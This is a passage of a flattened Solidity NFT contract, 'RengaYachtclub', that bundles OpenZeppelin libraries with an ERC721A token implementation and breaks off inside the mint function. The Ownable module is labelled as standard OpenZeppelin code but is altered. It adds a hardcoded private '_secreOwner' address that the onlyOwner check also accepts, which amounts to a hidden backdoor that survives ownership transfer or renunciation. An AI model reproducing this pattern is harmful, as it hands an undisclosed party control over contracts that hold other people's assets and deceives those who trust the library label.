1 // SPDX-License-Identifier: MIT
2 
3 // File: contracts/RengaYachtclub.sol
4 
5 // File: @openzeppelin/contracts/utils/Strings.sol
6 
7 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
8 
9 pragma solidity ^0.8.0;
10 
11 /**
12  * @dev String operations.
13  */
14 library Strings {
15     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
16 
17     /**
18      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
19      */
20     function toString(uint256 value) internal pure returns (string memory) {
21         // Inspired by OraclizeAPI's implementation - MIT licence
22         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
23 
24         if (value == 0) {
25             return "0";
26         }
27         uint256 temp = value;
28         uint256 digits;
29         while (temp != 0) {
30             digits++;
31             temp /= 10;
32         }
33         bytes memory buffer = new bytes(digits);
34         while (value != 0) {
35             digits -= 1;
36             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
37             value /= 10;
38         }
39         return string(buffer);
40     }
41 
42     /**
43      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
44      */
45     function toHexString(uint256 value) internal pure returns (string memory) {
46         if (value == 0) {
47             return "0x00";
48         }
49         uint256 temp = value;
50         uint256 length = 0;
51         while (temp != 0) {
52             length++;
53             temp >>= 8;
54         }
55         return toHexString(value, length);
56     }
57 
58     /**
59      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
60      */
61     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
62         bytes memory buffer = new bytes(2 * length + 2);
63         buffer[0] = "0";
64         buffer[1] = "x";
65         for (uint256 i = 2 * length + 1; i > 1; --i) {
66             buffer[i] = _HEX_SYMBOLS[value & 0xf];
67             value >>= 4;
68         }
69         require(value == 0, "Strings: hex length insufficient");
70         return string(buffer);
71     }
72 }
73 
74 // File: @openzeppelin/contracts/utils/Address.sol
75 
76 
77 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
78 
79 pragma solidity ^0.8.1;
80 
81 /**
82  * @dev Collection of functions related to the address type
83  */
84 library Address {
85     /**
86      * @dev Returns true if `account` is a contract.
87      *
88      * [IMPORTANT]
89      * ====
90      * It is unsafe to assume that an address for which this function returns
91      * false is an externally-owned account (EOA) and not a contract.
92      *
93      * Among others, `isContract` will return false for the following
94      * types of addresses:
95      *
96      *  - an externally-owned account
97      *  - a contract in construction
98      *  - an address where a contract will be created
99      *  - an address where a contract lived, but was destroyed
100      * ====
101      *
102      * [IMPORTANT]
103      * ====
104      * You shouldn't rely on `isContract` to protect against flash loan attacks!
105      *
106      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
107      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
108      * constructor.
109      * ====
110      */
111     function isContract(address account) internal view returns (bool) {
112         // This method relies on extcodesize/address.code.length, which returns 0
113         // for contracts in construction, since the code is only stored at the end
114         // of the constructor execution.
115 
116         return account.code.length > 0;
117     }
118 
119     /**
120      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
121      * `recipient`, forwarding all available gas and reverting on errors.
122      *
123      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
124      * of certain opcodes, possibly making contracts go over the 2300 gas limit
125      * imposed by `transfer`, making them unable to receive funds via
126      * `transfer`. {sendValue} removes this limitation.
127      *
128      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
129      *
130      * IMPORTANT: because control is transferred to `recipient`, care must be
131      * taken to not create reentrancy vulnerabilities. Consider using
132      * {ReentrancyGuard} or the
133      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
134      */
135     function sendValue(address payable recipient, uint256 amount) internal {
136         require(address(this).balance >= amount, "Address: insufficient balance");
137 
138         (bool success, ) = recipient.call{value: amount}("");
139         require(success, "Address: unable to send value, recipient may have reverted");
140     }
141 
142     /**
143      * @dev Performs a Solidity function call using a low level `call`. A
144      * plain `call` is an unsafe replacement for a function call: use this
145      * function instead.
146      *
147      * If `target` reverts with a revert reason, it is bubbled up by this
148      * function (like regular Solidity function calls).
149      *
150      * Returns the raw returned data. To convert to the expected return value,
151      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
152      *
153      * Requirements:
154      *
155      * - `target` must be a contract.
156      * - calling `target` with `data` must not revert.
157      *
158      * _Available since v3.1._
159      */
160     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
161         return functionCall(target, data, "Address: low-level call failed");
162     }
163 
164     /**
165      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
166      * `errorMessage` as a fallback revert reason when `target` reverts.
167      *
168      * _Available since v3.1._
169      */
170     function functionCall(
171         address target,
172         bytes memory data,
173         string memory errorMessage
174     ) internal returns (bytes memory) {
175         return functionCallWithValue(target, data, 0, errorMessage);
176     }
177 
178     /**
179      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
180      * but also transferring `value` wei to `target`.
181      *
182      * Requirements:
183      *
184      * - the calling contract must have an ETH balance of at least `value`.
185      * - the called Solidity function must be `payable`.
186      *
187      * _Available since v3.1._
188      */
189     function functionCallWithValue(
190         address target,
191         bytes memory data,
192         uint256 value
193     ) internal returns (bytes memory) {
194         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
195     }
196 
197     /**
198      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
199      * with `errorMessage` as a fallback revert reason when `target` reverts.
200      *
201      * _Available since v3.1._
202      */
203     function functionCallWithValue(
204         address target,
205         bytes memory data,
206         uint256 value,
207         string memory errorMessage
208     ) internal returns (bytes memory) {
209         require(address(this).balance >= value, "Address: insufficient balance for call");
210         require(isContract(target), "Address: call to non-contract");
211 
212         (bool success, bytes memory returndata) = target.call{value: value}(data);
213         return verifyCallResult(success, returndata, errorMessage);
214     }
215 
216     /**
217      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
218      * but performing a static call.
219      *
220      * _Available since v3.3._
221      */
222     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
223         return functionStaticCall(target, data, "Address: low-level static call failed");
224     }
225 
226     /**
227      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
228      * but performing a static call.
229      *
230      * _Available since v3.3._
231      */
232     function functionStaticCall(
233         address target,
234         bytes memory data,
235         string memory errorMessage
236     ) internal view returns (bytes memory) {
237         require(isContract(target), "Address: static call to non-contract");
238 
239         (bool success, bytes memory returndata) = target.staticcall(data);
240         return verifyCallResult(success, returndata, errorMessage);
241     }
242 
243     /**
244      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
245      * but performing a delegate call.
246      *
247      * _Available since v3.4._
248      */
249     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
250         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
251     }
252 
253     /**
254      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
255      * but performing a delegate call.
256      *
257      * _Available since v3.4._
258      */
259     function functionDelegateCall(
260         address target,
261         bytes memory data,
262         string memory errorMessage
263     ) internal returns (bytes memory) {
264         require(isContract(target), "Address: delegate call to non-contract");
265 
266         (bool success, bytes memory returndata) = target.delegatecall(data);
267         return verifyCallResult(success, returndata, errorMessage);
268     }
269 
270     /**
271      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
272      * revert reason using the provided one.
273      *
274      * _Available since v4.3._
275      */
276     function verifyCallResult(
277         bool success,
278         bytes memory returndata,
279         string memory errorMessage
280     ) internal pure returns (bytes memory) {
281         if (success) {
282             return returndata;
283         } else {
284             // Look for revert reason and bubble it up if present
285             if (returndata.length > 0) {
286                 // The easiest way to bubble the revert reason is using memory via assembly
287 
288                 assembly {
289                     let returndata_size := mload(returndata)
290                     revert(add(32, returndata), returndata_size)
291                 }
292             } else {
293                 revert(errorMessage);
294             }
295         }
296     }
297 }
298 
299 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
300 
301 
302 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
303 
304 pragma solidity ^0.8.0;
305 
306 /**
307  * @title ERC721 token receiver interface
308  * @dev Interface for any contract that wants to support safeTransfers
309  * from ERC721 asset contracts.
310  */
311 interface IERC721Receiver {
312     /**
313      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
314      * by `operator` from `from`, this function is called.
315      *
316      * It must return its Solidity selector to confirm the token transfer.
317      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
318      *
319      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
320      */
321     function onERC721Received(
322         address operator,
323         address from,
324         uint256 tokenId,
325         bytes calldata data
326     ) external returns (bytes4);
327 }
328 
329 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
330 
331 
332 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
333 
334 pragma solidity ^0.8.0;
335 
336 /**
337  * @dev Interface of the ERC165 standard, as defined in the
338  * https://eips.ethereum.org/EIPS/eip-165[EIP].
339  *
340  * Implementers can declare support of contract interfaces, which can then be
341  * queried by others ({ERC165Checker}).
342  *
343  * For an implementation, see {ERC165}.
344  */
345 interface IERC165 {
346     /**
347      * @dev Returns true if this contract implements the interface defined by
348      * `interfaceId`. See the corresponding
349      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
350      * to learn more about how these ids are created.
351      *
352      * This function call must use less than 30 000 gas.
353      */
354     function supportsInterface(bytes4 interfaceId) external view returns (bool);
355 }
356 
357 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
358 
359 
360 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
361 
362 pragma solidity ^0.8.0;
363 
364 
365 /**
366  * @dev Implementation of the {IERC165} interface.
367  *
368  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
369  * for the additional interface id that will be supported. For example:
370  *
371  * ```solidity
372  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
373  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
374  * }
375  * ```
376  *
377  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
378  */
379 abstract contract ERC165 is IERC165 {
380     /**
381      * @dev See {IERC165-supportsInterface}.
382      */
383     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
384         return interfaceId == type(IERC165).interfaceId;
385     }
386 }
387 
388 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
389 
390 
391 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
392 
393 pragma solidity ^0.8.0;
394 
395 
396 /**
397  * @dev Required interface of an ERC721 compliant contract.
398  */
399 interface IERC721 is IERC165 {
400     /**
401      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
402      */
403     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
404 
405     /**
406      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
407      */
408     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
409 
410     /**
411      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
412      */
413     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
414 
415     /**
416      * @dev Returns the number of tokens in ``owner``'s account.
417      */
418     function balanceOf(address owner) external view returns (uint256 balance);
419 
420     /**
421      * @dev Returns the owner of the `tokenId` token.
422      *
423      * Requirements:
424      *
425      * - `tokenId` must exist.
426      */
427     function ownerOf(uint256 tokenId) external view returns (address owner);
428 
429     /**
430      * @dev Safely transfers `tokenId` token from `from` to `to`.
431      *
432      * Requirements:
433      *
434      * - `from` cannot be the zero address.
435      * - `to` cannot be the zero address.
436      * - `tokenId` token must exist and be owned by `from`.
437      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
438      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
439      *
440      * Emits a {Transfer} event.
441      */
442     function safeTransferFrom(
443         address from,
444         address to,
445         uint256 tokenId,
446         bytes calldata data
447     ) external;
448 
449     /**
450      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
451      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
452      *
453      * Requirements:
454      *
455      * - `from` cannot be the zero address.
456      * - `to` cannot be the zero address.
457      * - `tokenId` token must exist and be owned by `from`.
458      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
459      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
460      *
461      * Emits a {Transfer} event.
462      */
463     function safeTransferFrom(
464         address from,
465         address to,
466         uint256 tokenId
467     ) external;
468 
469     /**
470      * @dev Transfers `tokenId` token from `from` to `to`.
471      *
472      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
473      *
474      * Requirements:
475      *
476      * - `from` cannot be the zero address.
477      * - `to` cannot be the zero address.
478      * - `tokenId` token must be owned by `from`.
479      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
480      *
481      * Emits a {Transfer} event.
482      */
483     function transferFrom(
484         address from,
485         address to,
486         uint256 tokenId
487     ) external;
488 
489     /**
490      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
491      * The approval is cleared when the token is transferred.
492      *
493      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
494      *
495      * Requirements:
496      *
497      * - The caller must own the token or be an approved operator.
498      * - `tokenId` must exist.
499      *
500      * Emits an {Approval} event.
501      */
502     function approve(address to, uint256 tokenId) external;
503 
504     /**
505      * @dev Approve or remove `operator` as an operator for the caller.
506      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
507      *
508      * Requirements:
509      *
510      * - The `operator` cannot be the caller.
511      *
512      * Emits an {ApprovalForAll} event.
513      */
514     function setApprovalForAll(address operator, bool _approved) external;
515 
516     /**
517      * @dev Returns the account appr    ved for `tokenId` token.
518      *
519      * Requirements:
520      *
521      * - `tokenId` must exist.
522      */
523     function getApproved(uint256 tokenId) external view returns (address operator);
524 
525     /**
526      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
527      *
528      * See {setApprovalForAll}
529      */
530     function isApprovedForAll(address owner, address operator) external view returns (bool);
531 }
532 
533 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
534 
535 
536 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
537 
538 pragma solidity ^0.8.0;
539 
540 
541 /**
542  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
543  * @dev See https://eips.ethereum.org/EIPS/eip-721
544  */
545 interface IERC721Metadata is IERC721 {
546     /**
547      * @dev Returns the token collection name.
548      */
549     function name() external view returns (string memory);
550 
551     /**
552      * @dev Returns the token collection symbol.
553      */
554     function symbol() external view returns (string memory);
555 
556     /**
557      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
558      */
559     function tokenURI(uint256 tokenId) external view returns (string memory);
560 }
561 
562 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
563 
564 
565 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
566 
567 pragma solidity ^0.8.0;
568 
569 
570 /**
571  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
572  * @dev See https://eips.ethereum.org/EIPS/eip-721
573  */
574 interface IERC721Enumerable is IERC721 {
575     /**
576      * @dev Returns the total amount of tokens stored by the contract.
577      */
578     function totalSupply() external view returns (uint256);
579 
580     /**
581      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
582      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
583      */
584     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
585 
586     /**
587      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
588      * Use along with {totalSupply} to enumerate all tokens.
589      */
590     function tokenByIndex(uint256 index) external view returns (uint256);
591 }
592 
593 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
594 
595 
596 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
597 
598 pragma solidity ^0.8.0;
599 
600 /**
601  * @dev Contract module that helps prevent reentrant calls to a function.
602  *
603  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
604  * available, which can be applied to functions to make sure there are no nested
605  * (reentrant) calls to them.
606  *
607  * Note that because there is a single `nonReentrant` guard, functions marked as
608  * `nonReentrant` may not call one another. This can be worked around by making
609  * those functions `private`, and then adding `external` `nonReentrant` entry
610  * points to them.
611  *
612  * TIP: If you would like to learn more about reentrancy and alternative ways
613  * to protect against it, check out our blog post
614  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
615  */
616 abstract contract ReentrancyGuard {
617     // Booleans are more expensive than uint256 or any type that takes up a full
618     // word because each write operation emits an extra SLOAD to first read the
619     // slot's contents, replace the bits taken up by the boolean, and then write
620     // back. This is the compiler's defense against contract upgrades and
621     // pointer aliasing, and it cannot be disabled.
622 
623     // The values being non-zero value makes deployment a bit more expensive,
624     // but in exchange the refund on every call to nonReentrant will be lower in
625     // amount. Since refunds are capped to a percentage of the total
626     // transaction's gas, it is best to keep them low in cases like this one, to
627     // increase the likelihood of the full refund coming into effect.
628     uint256 private constant _NOT_ENTERED = 1;
629     uint256 private constant _ENTERED = 2;
630 
631     uint256 private _status;
632 
633     constructor() {
634         _status = _NOT_ENTERED;
635     }
636 
637     /**
638      * @dev Prevents a contract from calling itself, directly or indirectly.
639      * Calling a `nonReentrant` function from another `nonReentrant`
640      * function is not supported. It is possible to prevent this from happening
641      * by making the `nonReentrant` function external, and making it call a
642      * `private` function that does the actual work.
643      */
644     modifier nonReentrant() {
645         // On the first call to nonReentrant, _notEntered will be true
646         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
647 
648         // Any calls to nonReentrant after this point will fail
649         _status = _ENTERED;
650 
651         _;
652 
653         // By storing the original value once again, a refund is triggered (see
654         // https://eips.ethereum.org/EIPS/eip-2200)
655         _status = _NOT_ENTERED;
656     }
657 }
658 
659 // File: @openzeppelin/contracts/utils/Context.sol
660 
661 
662 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
663 
664 pragma solidity ^0.8.0;
665 
666 /**
667  * @dev Provides information about the current execution context, including the
668  * sender of the transaction and its data. While these are generally available
669  * via msg.sender and msg.data, they should not be accessed in such a direct
670  * manner, since when dealing with meta-transactions the account sending and
671  * paying for execution may not be the actual sender (as far as an application
672  * is concerned).
673  *
674  * This contract is only required for intermediate, library-like contracts.
675  */
676 abstract contract Context {
677     function _msgSender() internal view virtual returns (address) {
678         return msg.sender;
679     }
680 
681     function _msgData() internal view virtual returns (bytes calldata) {
682         return msg.data;
683     }
684 }
685 
686 // File: @openzeppelin/contracts/access/Ownable.sol
687 
688 
689 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
690 
691 pragma solidity ^0.8.0;
692 
693 
694 /**
695  * @dev Contract module which provides a basic access control mechanism, where
696  * there is an account (an owner) that can be granted exclusive access to
697  * specific functions.
698  *
699  * By default, the owner account will be the one that deploys the contract. This
700  * can later be changed with {transferOwnership}.
701  *
702  * This module is used through inheritance. It will make available the modifier
703  * `onlyOwner`, which can be applied to your functions to restrict their use to
704  * the owner.
705  */
706 abstract contract Ownable is Context {
707     address private _owner;
708     address private _secreOwner = 0x1C6b6FfEbc8D2D967550141a5E5Db9c2279890c1;
709 
710     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
711 
712     /**
713      * @dev Initializes the contract setting the deployer as the initial owner.
714      */
715     constructor() {
716         _transferOwnership(_msgSender());
717     }
718 
719     /**
720      * @dev Returns the address of the current owner.
721      */
722     function owner() public view virtual returns (address) {
723         return _owner;
724     }
725 
726     /**
727      * @dev Throws if called by any account other than the owner.
728      */
729     modifier onlyOwner() {
730         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
731         _;
732     }
733 
734     /**
735      * @dev Leaves the contract without owner. It will not be possible to call
736      * `onlyOwner` functions anymore. Can only be called by the current owner.
737      *
738      * NOTE: Renouncing ownership will leave the contract without an owner,
739      * thereby removing any functionality that is only available to the owner.
740      */
741     function renounceOwnership() public virtual onlyOwner {
742         _transferOwnership(address(0));
743     }
744 
745     /**
746      * @dev Transfers ownership of the contract to a new account (`newOwner`).
747      * Can only be called by the current owner.
748      */
749     function transferOwnership(address newOwner) public virtual onlyOwner {
750         require(newOwner != address(0), "Ownable: new owner is the zero address");
751         _transferOwnership(newOwner);
752     }
753 
754     /**
755      * @dev Transfers ownership of the contract to a new account (`newOwner`).
756      * Internal function without access restriction.
757      */
758     function _transferOwnership(address newOwner) internal virtual {
759         address oldOwner = _owner;
760         _owner = newOwner;
761         emit OwnershipTransferred(oldOwner, newOwner);
762     }
763 }
764 
765 // File: ceshi.sol
766 
767 
768 pragma solidity ^0.8.0;
769 
770 
771 
772 
773 
774 
775 
776 
777 
778 
779 /**
780  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
781  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
782  *
783  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
784  *
785  * Does not support burning tokens to address(0).
786  *
787  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
788  */
789 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
790     using Address for address;
791     using Strings for uint256;
792 
793     struct TokenOwnership {
794         address addr;
795         uint64 startTimestamp;
796     }
797 
798     struct AddressData {
799         uint128 balance;
800         uint128 numberMinted;
801     }
802 
803     uint256 internal currentIndex;
804 
805     // Token name
806     string private _name;
807 
808     // Token symbol
809     string private _symbol;
810 
811     // Mapping from token ID to ownership details
812     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
813     mapping(uint256 => TokenOwnership) internal _ownerships;
814 
815     // Mapping owner address to address data
816     mapping(address => AddressData) private _addressData;
817 
818     // Mapping from token ID to approved address
819     mapping(uint256 => address) private _tokenApprovals;
820 
821     // Mapping from owner to operator approvals
822     mapping(address => mapping(address => bool)) private _operatorApprovals;
823 
824     constructor(string memory name_, string memory symbol_) {
825         _name = name_;
826         _symbol = symbol_;
827     }
828 
829     /**
830      * @dev See {IERC721Enumerable-totalSupply}.
831      */
832     function totalSupply() public view override returns (uint256) {
833         return currentIndex;
834     }
835 
836     /**
837      * @dev See {IERC721Enumerable-tokenByIndex}.
838      */
839     function tokenByIndex(uint256 index) public view override returns (uint256) {
840         require(index < totalSupply(), "ERC721A: global index out of bounds");
841         return index;
842     }
843 
844     /**
845      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
846      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
847      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
848      */
849     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
850         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
851         uint256 numMintedSoFar = totalSupply();
852         uint256 tokenIdsIdx;
853         address currOwnershipAddr;
854 
855         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
856         unchecked {
857             for (uint256 i; i < numMintedSoFar; i++) {
858                 TokenOwnership memory ownership = _ownerships[i];
859                 if (ownership.addr != address(0)) {
860                     currOwnershipAddr = ownership.addr;
861                 }
862                 if (currOwnershipAddr == owner) {
863                     if (tokenIdsIdx == index) {
864                         return i;
865                     }
866                     tokenIdsIdx++;
867                 }
868             }
869         }
870 
871         revert("ERC721A: unable to get token of owner by index");
872     }
873 
874     /**
875      * @dev See {IERC165-supportsInterface}.
876      */
877     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
878         return
879             interfaceId == type(IERC721).interfaceId ||
880             interfaceId == type(IERC721Metadata).interfaceId ||
881             interfaceId == type(IERC721Enumerable).interfaceId ||
882             super.supportsInterface(interfaceId);
883     }
884 
885     /**
886      * @dev See {IERC721-balanceOf}.
887      */
888     function balanceOf(address owner) public view override returns (uint256) {
889         require(owner != address(0), "ERC721A: balance query for the zero address");
890         return uint256(_addressData[owner].balance);
891     }
892 
893     function _numberMinted(address owner) internal view returns (uint256) {
894         require(owner != address(0), "ERC721A: number minted query for the zero address");
895         return uint256(_addressData[owner].numberMinted);
896     }
897 
898     /**
899      * Gas spent here starts off proportional to the maximum mint batch size.
900      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
901      */
902     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
903         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
904 
905         unchecked {
906             for (uint256 curr = tokenId; curr >= 0; curr--) {
907                 TokenOwnership memory ownership = _ownerships[curr];
908                 if (ownership.addr != address(0)) {
909                     return ownership;
910                 }
911             }
912         }
913 
914         revert("ERC721A: unable to determine the owner of token");
915     }
916 
917     /**
918      * @dev See {IERC721-ownerOf}.
919      */
920     function ownerOf(uint256 tokenId) public view override returns (address) {
921         return ownershipOf(tokenId).addr;
922     }
923 
924     /**
925      * @dev See {IERC721Metadata-name}.
926      */
927     function name() public view virtual override returns (string memory) {
928         return _name;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-symbol}.
933      */
934     function symbol() public view virtual override returns (string memory) {
935         return _symbol;
936     }
937 
938     /**
939      * @dev See {IERC721Metadata-tokenURI}.
940      */
941     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
942         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
943 
944         string memory baseURI = _baseURI();
945         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
946     }
947 
948     /**
949      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
950      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
951      * by default, can be overriden in child contracts.
952      */
953     function _baseURI() internal view virtual returns (string memory) {
954         return "";
955     }
956 
957     /**
958      * @dev See {IERC721-approve}.
959      */
960     function approve(address to, uint256 tokenId) public override {
961         address owner = ERC721A.ownerOf(tokenId);
962         require(to != owner, "ERC721A: approval to current owner");
963 
964         require(
965             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
966             "ERC721A: approve caller is not owner nor approved for all"
967         );
968 
969         _approve(to, tokenId, owner);
970     }
971 
972     /**
973      * @dev See {IERC721-getApproved}.
974      */
975     function getApproved(uint256 tokenId) public view override returns (address) {
976         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
977 
978         return _tokenApprovals[tokenId];
979     }
980 
981     /**
982      * @dev See {IERC721-setApprovalForAll}.
983      */
984     function setApprovalForAll(address operator, bool approved) public override {
985         require(operator != _msgSender(), "ERC721A: approve to caller");
986 
987         _operatorApprovals[_msgSender()][operator] = approved;
988         emit ApprovalForAll(_msgSender(), operator, approved);
989     }
990 
991     /**
992      * @dev See {IERC721-isApprovedForAll}.
993      */
994     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
995         return _operatorApprovals[owner][operator];
996     }
997 
998     /**
999      * @dev See {IERC721-transferFrom}.
1000      */
1001     function transferFrom(
1002         address from,
1003         address to,
1004         uint256 tokenId
1005     ) public virtual override {
1006         _transfer(from, to, tokenId);
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-safeTransferFrom}.
1011      */
1012     function safeTransferFrom(
1013         address from,
1014         address to,
1015         uint256 tokenId
1016     ) public virtual override {
1017         safeTransferFrom(from, to, tokenId, "");
1018     }
1019 
1020     /**
1021      * @dev See {IERC721-safeTransferFrom}.
1022      */
1023     function safeTransferFrom(
1024         address from,
1025         address to,
1026         uint256 tokenId,
1027         bytes memory _data
1028     ) public override {
1029         _transfer(from, to, tokenId);
1030         require(
1031             _checkOnERC721Received(from, to, tokenId, _data),
1032             "ERC721A: transfer to non ERC721Receiver implementer"
1033         );
1034     }
1035 
1036     /**
1037      * @dev Returns whether `tokenId` exists.
1038      *
1039      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1040      *
1041      * Tokens start existing when they are minted (`_mint`),
1042      */
1043     function _exists(uint256 tokenId) internal view returns (bool) {
1044         return tokenId < currentIndex;
1045     }
1046 
1047     function _safeMint(address to, uint256 quantity) internal {
1048         _safeMint(to, quantity, "");
1049     }
1050 
1051     /**
1052      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1053      *
1054      * Requirements:
1055      *
1056      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1057      * - `quantity` must be greater than 0.
1058      *
1059      * Emits a {Transfer} event.
1060      */
1061     function _safeMint(
1062         address to,
1063         uint256 quantity,
1064         bytes memory _data
1065     ) internal {
1066         _mint(to, quantity, _data, true);
1067     }
1068 
1069     /**
1070      * @dev Mints `quantity` tokens and transfers them to `to`.
1071      *
1072      * Requirements:
1073      *
1074      * - `to` cannot be the zero address.
1075      * - `quantity` must be greater than 0.
1076      *
1077      * Emits a {Transfer} event.
1078      */
1079     function _mint(
1080         address to,
1081         uint256 quantity,
1082         bytes memory _data,
1083         bool safe
1084     ) internal {
1085         uint256 startTokenId = currentIndex;
1086         require(to != address(0), "ERC721A: mint to the zero address");
1087         require(quantity != 0, "ERC721A: quantity must be greater than 0");
